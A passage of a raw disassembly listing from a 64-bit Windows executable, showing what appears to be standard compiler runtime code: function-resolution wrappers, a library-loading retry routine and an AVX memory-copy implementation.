   140002dd2:	0f 85 99 00 00 00    	jne    0x140002e71
   140002dd8:	eb 6b                	jmp    0x140002e45
   140002dda:	4d 8b bc f7 b8 f0 00 	mov    0xf0b8(%r15,%rsi,8),%r15
   140002de1:	00 
   140002de2:	33 d2                	xor    %edx,%edx
   140002de4:	49 8b cf             	mov    %r15,%rcx
   140002de7:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140002ded:	ff 15 fd b2 00 00    	call   *0xb2fd(%rip)        # 0x14000e0f0
   140002df3:	48 8b d8             	mov    %rax,%rbx
   140002df6:	48 85 c0             	test   %rax,%rax
   140002df9:	75 56                	jne    0x140002e51
   140002dfb:	ff 15 8f b2 00 00    	call   *0xb28f(%rip)        # 0x14000e090
   140002e01:	83 f8 57             	cmp    $0x57,%eax
   140002e04:	75 2d                	jne    0x140002e33
   140002e06:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140002e0a:	49 8b cf             	mov    %r15,%rcx
   140002e0d:	48 8d 15 54 c3 00 00 	lea    0xc354(%rip),%rdx        # 0x14000f168
   140002e14:	e8 27 20 00 00       	call   0x140004e40
   140002e19:	85 c0                	test   %eax,%eax
   140002e1b:	74 16                	je     0x140002e33
   140002e1d:	45 33 c0             	xor    %r8d,%r8d
   140002e20:	33 d2                	xor    %edx,%edx
   140002e22:	49 8b cf             	mov    %r15,%rcx
   140002e25:	ff 15 c5 b2 00 00    	call   *0xb2c5(%rip)        # 0x14000e0f0
   140002e2b:	48 8b d8             	mov    %rax,%rbx
   140002e2e:	48 85 c0             	test   %rax,%rax
   140002e31:	75 1e                	jne    0x140002e51
   140002e33:	49 8b c6             	mov    %r14,%rax
   140002e36:	4c 8d 3d c3 d1 ff ff 	lea    -0x2e3d(%rip),%r15        # 0x140000000
   140002e3d:	49 87 84 f7 d8 7b 01 	xchg   %rax,0x17bd8(%r15,%rsi,8)
   140002e44:	00 
   140002e45:	48 83 c5 04          	add    $0x4,%rbp
   140002e49:	49 3b ec             	cmp    %r12,%rbp
   140002e4c:	e9 67 ff ff ff       	jmp    0x140002db8
   140002e51:	48 8b c3             	mov    %rbx,%rax
   140002e54:	4c 8d 3d a5 d1 ff ff 	lea    -0x2e5b(%rip),%r15        # 0x140000000
   140002e5b:	49 87 84 f7 d8 7b 01 	xchg   %rax,0x17bd8(%r15,%rsi,8)
   140002e62:	00 
   140002e63:	48 85 c0             	test   %rax,%rax
   140002e66:	74 09                	je     0x140002e71
   140002e68:	48 8b cb             	mov    %rbx,%rcx
   140002e6b:	ff 15 77 b2 00 00    	call   *0xb277(%rip)        # 0x14000e0e8
   140002e71:	49 8b d5             	mov    %r13,%rdx
   140002e74:	48 8b cb             	mov    %rbx,%rcx
   140002e77:	ff 15 8b b1 00 00    	call   *0xb18b(%rip)        # 0x14000e008
   140002e7d:	48 85 c0             	test   %rax,%rax
   140002e80:	74 0d                	je     0x140002e8f
   140002e82:	48 8b c8             	mov    %rax,%rcx
   140002e85:	49 87 8c ff f0 7b 01 	xchg   %rcx,0x17bf0(%r15,%rdi,8)
   140002e8c:	00 
   140002e8d:	eb 0a                	jmp    0x140002e99
   140002e8f:	4d 87 b4 ff f0 7b 01 	xchg   %r14,0x17bf0(%r15,%rdi,8)
   140002e96:	00 
   140002e97:	33 c0                	xor    %eax,%eax
   140002e99:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002e9e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002ea3:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140002ea8:	48 83 c4 20          	add    $0x20,%rsp
   140002eac:	41 5f                	pop    %r15
   140002eae:	41 5e                	pop    %r14
   140002eb0:	41 5d                	pop    %r13
   140002eb2:	41 5c                	pop    %r12
   140002eb4:	5f                   	pop    %rdi
   140002eb5:	c3                   	ret
   140002eb6:	cc                   	int3
   140002eb7:	cc                   	int3
   140002eb8:	40 53                	rex push %rbx
   140002eba:	48 83 ec 20          	sub    $0x20,%rsp
   140002ebe:	48 8b d9             	mov    %rcx,%rbx
   140002ec1:	4c 8d 0d b8 c2 00 00 	lea    0xc2b8(%rip),%r9        # 0x14000f180
   140002ec8:	33 c9                	xor    %ecx,%ecx
   140002eca:	4c 8d 05 a7 c2 00 00 	lea    0xc2a7(%rip),%r8        # 0x14000f178
   140002ed1:	48 8d 15 a8 c2 00 00 	lea    0xc2a8(%rip),%rdx        # 0x14000f180
   140002ed8:	e8 8b fe ff ff       	call   0x140002d68
   140002edd:	48 85 c0             	test   %rax,%rax
   140002ee0:	74 0f                	je     0x140002ef1
   140002ee2:	48 8b cb             	mov    %rbx,%rcx
   140002ee5:	48 83 c4 20          	add    $0x20,%rsp
   140002ee9:	5b                   	pop    %rbx
   140002eea:	48 ff 25 47 b3 00 00 	rex.W jmp *0xb347(%rip)        # 0x14000e238
   140002ef1:	48 83 c4 20          	add    $0x20,%rsp
   140002ef5:	5b                   	pop    %rbx
   140002ef6:	48 ff 25 cb b1 00 00 	rex.W jmp *0xb1cb(%rip)        # 0x14000e0c8
   140002efd:	cc                   	int3
   140002efe:	cc                   	int3
   140002eff:	cc                   	int3
   140002f00:	40 53                	rex push %rbx
   140002f02:	48 83 ec 20          	sub    $0x20,%rsp
   140002f06:	8b d9                	mov    %ecx,%ebx
   140002f08:	4c 8d 0d 89 c2 00 00 	lea    0xc289(%rip),%r9        # 0x14000f198
   140002f0f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002f14:	4c 8d 05 75 c2 00 00 	lea    0xc275(%rip),%r8        # 0x14000f190
   140002f1b:	48 8d 15 76 c2 00 00 	lea    0xc276(%rip),%rdx        # 0x14000f198
   140002f22:	e8 41 fe ff ff       	call   0x140002d68
   140002f27:	8b cb                	mov    %ebx,%ecx
   140002f29:	48 85 c0             	test   %rax,%rax
   140002f2c:	74 0c                	je     0x140002f3a
   140002f2e:	48 83 c4 20          	add    $0x20,%rsp
   140002f32:	5b                   	pop    %rbx
   140002f33:	48 ff 25 fe b2 00 00 	rex.W jmp *0xb2fe(%rip)        # 0x14000e238
   140002f3a:	48 83 c4 20          	add    $0x20,%rsp
   140002f3e:	5b                   	pop    %rbx
   140002f3f:	48 ff 25 9a b1 00 00 	rex.W jmp *0xb19a(%rip)        # 0x14000e0e0
   140002f46:	cc                   	int3
   140002f47:	cc                   	int3
   140002f48:	40 53                	rex push %rbx
   140002f4a:	48 83 ec 20          	sub    $0x20,%rsp
   140002f4e:	8b d9                	mov    %ecx,%ebx
   140002f50:	4c 8d 0d 51 c2 00 00 	lea    0xc251(%rip),%r9        # 0x14000f1a8
   140002f57:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002f5c:	4c 8d 05 3d c2 00 00 	lea    0xc23d(%rip),%r8        # 0x14000f1a0
   140002f63:	48 8d 15 3e c2 00 00 	lea    0xc23e(%rip),%rdx        # 0x14000f1a8
   140002f6a:	e8 f9 fd ff ff       	call   0x140002d68
   140002f6f:	8b cb                	mov    %ebx,%ecx
   140002f71:	48 85 c0             	test   %rax,%rax
   140002f74:	74 0c                	je     0x140002f82
   140002f76:	48 83 c4 20          	add    $0x20,%rsp
   140002f7a:	5b                   	pop    %rbx
   140002f7b:	48 ff 25 b6 b2 00 00 	rex.W jmp *0xb2b6(%rip)        # 0x14000e238
   140002f82:	48 83 c4 20          	add    $0x20,%rsp
   140002f86:	5b                   	pop    %rbx
   140002f87:	48 ff 25 42 b1 00 00 	rex.W jmp *0xb142(%rip)        # 0x14000e0d0
   140002f8e:	cc                   	int3
   140002f8f:	cc                   	int3
   140002f90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002f95:	57                   	push   %rdi
   140002f96:	48 83 ec 20          	sub    $0x20,%rsp
   140002f9a:	48 8b da             	mov    %rdx,%rbx
   140002f9d:	4c 8d 0d 1c c2 00 00 	lea    0xc21c(%rip),%r9        # 0x14000f1c0
   140002fa4:	8b f9                	mov    %ecx,%edi
   140002fa6:	48 8d 15 13 c2 00 00 	lea    0xc213(%rip),%rdx        # 0x14000f1c0
   140002fad:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002fb2:	4c 8d 05 ff c1 00 00 	lea    0xc1ff(%rip),%r8        # 0x14000f1b8
   140002fb9:	e8 aa fd ff ff       	call   0x140002d68
   140002fbe:	48 8b d3             	mov    %rbx,%rdx
   140002fc1:	8b cf                	mov    %edi,%ecx
   140002fc3:	48 85 c0             	test   %rax,%rax
   140002fc6:	74 08                	je     0x140002fd0
   140002fc8:	ff 15 6a b2 00 00    	call   *0xb26a(%rip)        # 0x14000e238
   140002fce:	eb 06                	jmp    0x140002fd6
   140002fd0:	ff 15 02 b1 00 00    	call   *0xb102(%rip)        # 0x14000e0d8
   140002fd6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002fdb:	48 83 c4 20          	add    $0x20,%rsp
   140002fdf:	5f                   	pop    %rdi
   140002fe0:	c3                   	ret
   140002fe1:	cc                   	int3
   140002fe2:	cc                   	int3
   140002fe3:	cc                   	int3
   140002fe4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002fe9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002fee:	57                   	push   %rdi
   140002fef:	48 83 ec 20          	sub    $0x20,%rsp
   140002ff3:	41 8b f0             	mov    %r8d,%esi
   140002ff6:	4c 8d 0d db c1 00 00 	lea    0xc1db(%rip),%r9        # 0x14000f1d8
   140002ffd:	8b da                	mov    %edx,%ebx
   140002fff:	4c 8d 05 ca c1 00 00 	lea    0xc1ca(%rip),%r8        # 0x14000f1d0
   140003006:	48 8b f9             	mov    %rcx,%rdi
   140003009:	48 8d 15 c8 c1 00 00 	lea    0xc1c8(%rip),%rdx        # 0x14000f1d8
   140003010:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003015:	e8 4e fd ff ff       	call   0x140002d68
   14000301a:	8b d3                	mov    %ebx,%edx
   14000301c:	48 8b cf             	mov    %rdi,%rcx
   14000301f:	48 85 c0             	test   %rax,%rax
   140003022:	74 0b                	je     0x14000302f
   140003024:	44 8b c6             	mov    %esi,%r8d
   140003027:	ff 15 0b b2 00 00    	call   *0xb20b(%rip)        # 0x14000e238
   14000302d:	eb 06                	jmp    0x140003035
   14000302f:	ff 15 8b b0 00 00    	call   *0xb08b(%rip)        # 0x14000e0c0
   140003035:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000303a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000303f:	48 83 c4 20          	add    $0x20,%rsp
   140003043:	5f                   	pop    %rdi
   140003044:	c3                   	ret
   140003045:	cc                   	int3
   140003046:	cc                   	int3
   140003047:	cc                   	int3
   140003048:	cc                   	int3
   140003049:	cc                   	int3
   14000304a:	cc                   	int3
   14000304b:	cc                   	int3
   14000304c:	cc                   	int3
   14000304d:	cc                   	int3
   14000304e:	cc                   	int3
   14000304f:	cc                   	int3
   140003050:	cc                   	int3
   140003051:	cc                   	int3
   140003052:	cc                   	int3
   140003053:	cc                   	int3
   140003054:	cc                   	int3
   140003055:	cc                   	int3
   140003056:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000305d:	00 00 00 
   140003060:	48 83 ec 28          	sub    $0x28,%rsp
   140003064:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003069:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000306e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140003073:	48 8b 12             	mov    (%rdx),%rdx
   140003076:	48 8b c1             	mov    %rcx,%rax
   140003079:	e8 12 fc ff ff       	call   0x140002c90
   14000307e:	ff d0                	call   *%rax
   140003080:	e8 3b fc ff ff       	call   0x140002cc0
   140003085:	48 8b c8             	mov    %rax,%rcx
   140003088:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000308d:	48 8b 12             	mov    (%rdx),%rdx
   140003090:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003096:	e8 f5 fb ff ff       	call   0x140002c90
   14000309b:	48 83 c4 28          	add    $0x28,%rsp
   14000309f:	c3                   	ret
   1400030a0:	cc                   	int3
   1400030a1:	cc                   	int3
   1400030a2:	cc                   	int3
   1400030a3:	cc                   	int3
   1400030a4:	cc                   	int3
   1400030a5:	cc                   	int3
   1400030a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400030ad:	00 00 00 
   1400030b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400030b4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400030b9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400030be:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   1400030c3:	48 8b 12             	mov    (%rdx),%rdx
   1400030c6:	48 8b c1             	mov    %rcx,%rax
   1400030c9:	e8 c2 fb ff ff       	call   0x140002c90
   1400030ce:	ff d0                	call   *%rax
   1400030d0:	e8 eb fb ff ff       	call   0x140002cc0
   1400030d5:	48 83 c4 28          	add    $0x28,%rsp
   1400030d9:	c3                   	ret
   1400030da:	cc                   	int3
   1400030db:	cc                   	int3
   1400030dc:	cc                   	int3
   1400030dd:	cc                   	int3
   1400030de:	cc                   	int3
   1400030df:	cc                   	int3
   1400030e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400030e4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400030e9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400030ee:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400030f3:	48 8b 12             	mov    (%rdx),%rdx
   1400030f6:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400030fc:	e8 8f fb ff ff       	call   0x140002c90
   140003101:	48 83 c4 28          	add    $0x28,%rsp
   140003105:	c3                   	ret
   140003106:	cc                   	int3
   140003107:	cc                   	int3
   140003108:	cc                   	int3
   140003109:	cc                   	int3
   14000310a:	cc                   	int3
   14000310b:	cc                   	int3
   14000310c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003110:	48 83 ec 28          	sub    $0x28,%rsp
   140003114:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003119:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000311e:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140003123:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   140003128:	45 8b c1             	mov    %r9d,%r8d
   14000312b:	48 8b c1             	mov    %rcx,%rax
   14000312e:	e8 5d fb ff ff       	call   0x140002c90
   140003133:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003138:	ff d0                	call   *%rax
   14000313a:	e8 81 fb ff ff       	call   0x140002cc0
   14000313f:	48 8b c8             	mov    %rax,%rcx
   140003142:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140003147:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000314d:	e8 3e fb ff ff       	call   0x140002c90
   140003152:	48 83 c4 28          	add    $0x28,%rsp
   140003156:	c3                   	ret
   140003157:	cc                   	int3
   140003158:	cc                   	int3
   140003159:	cc                   	int3
   14000315a:	cc                   	int3
   14000315b:	cc                   	int3
   14000315c:	cc                   	int3
   14000315d:	cc                   	int3
   14000315e:	cc                   	int3
   14000315f:	cc                   	int3
   140003160:	cc                   	int3
   140003161:	cc                   	int3
   140003162:	cc                   	int3
   140003163:	cc                   	int3
   140003164:	cc                   	int3
   140003165:	cc                   	int3
   140003166:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000316d:	00 00 00 
   140003170:	57                   	push   %rdi
   140003171:	56                   	push   %rsi
   140003172:	48 8b f9             	mov    %rcx,%rdi
   140003175:	48 8b f2             	mov    %rdx,%rsi
   140003178:	49 8b c8             	mov    %r8,%rcx
   14000317b:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000317d:	5e                   	pop    %rsi
   14000317e:	5f                   	pop    %rdi
   14000317f:	c3                   	ret
   140003180:	cc                   	int3
   140003181:	cc                   	int3
   140003182:	cc                   	int3
   140003183:	cc                   	int3
   140003184:	cc                   	int3
   140003185:	cc                   	int3
   140003186:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000318d:	00 00 00 
   140003190:	48 8b c1             	mov    %rcx,%rax
   140003193:	4c 8d 15 66 ce ff ff 	lea    -0x319a(%rip),%r10        # 0x140000000
   14000319a:	49 83 f8 0f          	cmp    $0xf,%r8
   14000319e:	0f 87 0c 01 00 00    	ja     0x1400032b0
   1400031a4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400031ab:	00 00 00 00 00 
   1400031b0:	47 8b 8c 82 50 a0 01 	mov    0x1a050(%r10,%r8,4),%r9d
   1400031b7:	00 
   1400031b8:	4d 03 ca             	add    %r10,%r9
   1400031bb:	41 ff e1             	jmp    *%r9
   1400031be:	c3                   	ret
   1400031bf:	90                   	nop
   1400031c0:	4c 8b 02             	mov    (%rdx),%r8
   1400031c3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400031c6:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   1400031cb:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   1400031d0:	4c 89 00             	mov    %r8,(%rax)
   1400031d3:	89 48 08             	mov    %ecx,0x8(%rax)
   1400031d6:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   1400031db:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   1400031df:	c3                   	ret
   1400031e0:	4c 8b 02             	mov    (%rdx),%r8
   1400031e3:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   1400031e7:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   1400031ec:	4c 89 00             	mov    %r8,(%rax)
   1400031ef:	66 89 48 08          	mov    %cx,0x8(%rax)
   1400031f3:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   1400031f7:	c3                   	ret
   1400031f8:	0f b7 0a             	movzwl (%rdx),%ecx
   1400031fb:	66 89 08             	mov    %cx,(%rax)
   1400031fe:	c3                   	ret
   1400031ff:	90                   	nop
   140003200:	8b 0a                	mov    (%rdx),%ecx
   140003202:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140003207:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000320c:	89 08                	mov    %ecx,(%rax)
   14000320e:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140003213:	44 88 48 06          	mov    %r9b,0x6(%rax)
   140003217:	c3                   	ret
   140003218:	4c 8b 02             	mov    (%rdx),%r8
   14000321b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000321e:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   140003223:	4c 89 00             	mov    %r8,(%rax)
   140003226:	89 48 08             	mov    %ecx,0x8(%rax)
   140003229:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000322e:	c3                   	ret
   14000322f:	0f b7 0a             	movzwl (%rdx),%ecx
   140003232:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   140003237:	66 89 08             	mov    %cx,(%rax)
   14000323a:	44 88 40 02          	mov    %r8b,0x2(%rax)
   14000323e:	c3                   	ret
   14000323f:	90                   	nop
   140003240:	4c 8b 02             	mov    (%rdx),%r8
   140003243:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140003246:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   14000324b:	4c 89 00             	mov    %r8,(%rax)
   14000324e:	89 48 08             	mov    %ecx,0x8(%rax)
   140003251:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   140003255:	c3                   	ret
   140003256:	4c 8b 02             	mov    (%rdx),%r8
   140003259:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000325d:	4c 89 00             	mov    %r8,(%rax)
   140003260:	66 89 48 08          	mov    %cx,0x8(%rax)
   140003264:	c3                   	ret
   140003265:	4c 8b 02             	mov    (%rdx),%r8
   140003268:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000326c:	4c 89 00             	mov    %r8,(%rax)
   14000326f:	88 48 08             	mov    %cl,0x8(%rax)
   140003272:	c3                   	ret
   140003273:	4c 8b 02             	mov    (%rdx),%r8
   140003276:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140003279:	4c 89 00             	mov    %r8,(%rax)
   14000327c:	89 48 08             	mov    %ecx,0x8(%rax)
   14000327f:	c3                   	ret
   140003280:	8b 0a                	mov    (%rdx),%ecx
   140003282:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140003287:	89 08                	mov    %ecx,(%rax)
   140003289:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000328e:	c3                   	ret
   14000328f:	8b 0a                	mov    (%rdx),%ecx
   140003291:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   140003296:	89 08                	mov    %ecx,(%rax)
   140003298:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000329c:	c3                   	ret
   14000329d:	48 8b 0a             	mov    (%rdx),%rcx
   1400032a0:	48 89 08             	mov    %rcx,(%rax)
   1400032a3:	c3                   	ret
   1400032a4:	0f b6 0a             	movzbl (%rdx),%ecx
   1400032a7:	88 08                	mov    %cl,(%rax)
   1400032a9:	c3                   	ret
   1400032aa:	8b 0a                	mov    (%rdx),%ecx
   1400032ac:	89 08                	mov    %ecx,(%rax)
   1400032ae:	c3                   	ret
   1400032af:	90                   	nop
   1400032b0:	49 83 f8 20          	cmp    $0x20,%r8
   1400032b4:	77 17                	ja     0x1400032cd
   1400032b6:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   1400032ba:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   1400032c1:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   1400032c5:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   1400032cc:	c3                   	ret
   1400032cd:	48 3b d1             	cmp    %rcx,%rdx
   1400032d0:	73 0e                	jae    0x1400032e0
   1400032d2:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   1400032d6:	49 3b c9             	cmp    %r9,%rcx
   1400032d9:	0f 82 41 04 00 00    	jb     0x140003720
   1400032df:	90                   	nop
   1400032e0:	83 3d 21 3d 01 00 03 	cmpl   $0x3,0x13d21(%rip)        # 0x140017008
   1400032e7:	0f 82 e3 02 00 00    	jb     0x1400035d0
   1400032ed:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   1400032f4:	76 16                	jbe    0x14000330c
   1400032f6:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   1400032fd:	77 0d                	ja     0x14000330c
   1400032ff:	f6 05 aa 47 01 00 02 	testb  $0x2,0x147aa(%rip)        # 0x140017ab0
   140003306:	0f 85 64 fe ff ff    	jne    0x140003170
   14000330c:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   140003310:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   140003317:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000331e:	0f 86 c4 00 00 00    	jbe    0x1400033e8
   140003324:	4c 8b c9             	mov    %rcx,%r9
   140003327:	49 83 e1 1f          	and    $0x1f,%r9
   14000332b:	49 83 e9 20          	sub    $0x20,%r9
   14000332f:	49 2b c9             	sub    %r9,%rcx
   140003332:	49 2b d1             	sub    %r9,%rdx
   140003335:	4d 03 c1             	add    %r9,%r8
   140003338:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000333f:	0f 86 a3 00 00 00    	jbe    0x1400033e8
   140003345:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000334c:	0f 87 3e 01 00 00    	ja     0x140003490
   140003352:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140003359:	1f 84 00 00 00 00 00 
   140003360:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   140003364:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   140003369:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000336e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   140003373:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   140003377:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   14000337c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   140003381:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   140003386:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000338d:	00 
   14000338e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140003395:	00 
   140003396:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000339d:	00 
   14000339e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   1400033a5:	00 
   1400033a6:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   1400033ad:	00 
   1400033ae:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   1400033b5:	00 
   1400033b6:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   1400033bd:	00 
   1400033be:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   1400033c5:	00 
   1400033c6:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   1400033cd:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   1400033d4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   1400033db:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   1400033e2:	0f 83 78 ff ff ff    	jae    0x140003360
   1400033e8:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   1400033ec:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   1400033f0:	4d 8b d9             	mov    %r9,%r11
   1400033f3:	49 c1 eb 05          	shr    $0x5,%r11
   1400033f7:	47 8b 9c 9a 90 a0 01 	mov    0x1a090(%r10,%r11,4),%r11d
   1400033fe:	00 
   1400033ff:	4d 03 da             	add    %r10,%r11
   140003402:	41 ff e3             	jmp    *%r11
   140003405:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000340c:	ff ff ff 
   14000340f:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   140003416:	ff ff ff 
   140003419:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   140003420:	ff ff ff 
   140003423:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   14000342a:	ff ff ff 
   14000342d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   140003434:	ff ff ff 
   140003437:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   14000343e:	ff ff ff 
   140003441:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   140003448:	ff ff ff 
   14000344b:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   140003452:	ff ff ff 
   140003455:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000345c:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   140003463:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000346a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   140003471:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   140003478:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   14000347f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140003486:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000348a:	c5 f8 77             	vzeroupper
   14000348d:	c3                   	ret
   14000348e:	66 90                	xchg   %ax,%ax
   140003490:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   140003494:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   140003499:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000349e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   1400034a3:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   1400034a7:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   1400034ac:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   1400034b1:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   1400034b6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   1400034bd:	00 
   1400034be:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   1400034c5:	00 
   1400034c6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   1400034cd:	00 
   1400034ce:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   1400034d5:	00 
